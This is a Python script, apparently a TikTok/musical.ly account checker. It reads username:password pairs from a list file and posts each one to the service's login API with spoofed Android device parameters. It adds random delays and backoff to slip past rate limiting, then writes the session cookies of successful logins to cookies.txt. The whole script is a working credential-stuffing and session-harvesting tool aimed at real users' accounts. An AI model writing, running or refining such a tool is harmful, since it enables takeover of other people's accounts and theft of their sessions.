import requests
import time
import json
import random

print("""

Telegram : Jxshe | Github : xForget
""")

class tigtog():
    def __init__(self):
        self.delay = 10  # Base delay between requests in seconds
        self.max_retries = 3
        choice = int(input("""
1. Manual Login (user:pass) 2. List Login (list.txt) """))
        if choice == 1:
            self.username = input("Username: ")
            self.password = input("Password: ")
            self.login()
        elif choice == 2:
            for xx in open("list.txt","r").read().splitlines():
                i = str(xx)
                try:
                    self.username = i.split(":")[0]
                    self.password = i.split(":")[1]
                    self.login()
                    # Add delay between requests to avoid rate limiting
                    wait_time = self.delay + random.uniform(1, 5)
                    print(f"Waiting {wait_time:.2f} seconds before next request...")
                    time.sleep(wait_time)
                except Exception as e:
                    print(f"Error processing line: {i} - {str(e)}")
        else:
            print("Incorrect Choice")
            exit()

    def login(self):
        url ="https://api2.musical.ly/passport/user/login/?mix_mode=1&username=1&email=&mobile=&account=&password=hg&captcha=&ts=&app_type=normal&app_language=en&manifest_version_code=2018073102&_rticket=1633593458298&iid=7011916372695598854&channel=googleplay&language=en&fp=&device_type=SM-G955F&resolution=1440*2792&openudid=91cac57ba8ef12b6&update_version_code=2018073102&sys_region=AS&os_api=28&is_my_cn=0&timezone_name=Asia/Muscat&dpi=560&carrier_region=OM&ac=wifi&device_id=6785177577851504133&mcc_mnc=42203&timezone_offset=14400&os_version=9&version_code=800&carrier_region_v2=422&app_name=musical_ly&version_name=8.0.0&device_brand=samsung&ssmix=a&build_number=8.0.0&device_platform=android&region=US&aid=&as=&cp=Qm&mas="

        headers={'User-Agent':'com.zhiliaoapp.musically/2018073102 (Linux; U; Android 9; en_AS; SM-G955F; Build/PPR1.180610.011; Cronet/58.0.2991.0)','Host':'api2.musical.ly','Connection':'keep-alive'}

        data={'username':self.username,'password':self.password}

        for attempt in range(self.max_retries):
            try:
                r = requests.post(url, headers=headers, data=data, timeout=30)
                r.raise_for_status()  # Raise exception for 4XX/5XX responses
                
                if "Incorrect account or password" in r.text:
                    print(f"{self.username} : Incorrect Login Info")
                    break
                elif 'message":"success' in r.text:
                    print(f"{self.username} : SessionID: {r.cookies['sessionid']}")
                    with open("cookies.txt","a") as f:
                        f.write(f"{self.username}:{r.cookies['sessionid']}\n")
                    break
                elif "Too many requests" in r.text or "rate_limit" in r.text:
                    retry_after = (attempt + 1) * 30  # Exponential backoff
                    print(f"Rate limited. Waiting {retry_after} seconds before retry...")
                    time.sleep(retry_after)
                else:
                    try:
                        response_json = json.loads(r.text)
                        print(f"API Error: {response_json.get('message', 'Unknown error')}")
                    except:
                        print(f"API Response: {r.text[:100]}...")
                    
                    if attempt < self.max_retries - 1:
                        wait_time = (attempt + 1) * self.delay
                        print(f"Retrying in {wait_time} seconds... (Attempt {attempt+1}/{self.max_retries})")
                        time.sleep(wait_time)
                    else:
                        print("Max retries reached. Moving to next account.")
            except requests.exceptions.RequestException as e:
                print(f"Network error: {str(e)}")
                if attempt < self.max_retries - 1:
                    wait_time = (attempt + 1) * self.delay
                    print(f"Retrying in {wait_time} seconds... (Attempt {attempt+1}/{self.max_retries})")
                    time.sleep(wait_time)
                else:
                    print("Max retries reached. Moving to next account.")
            
if __name__ == "__main__":
    tigtog()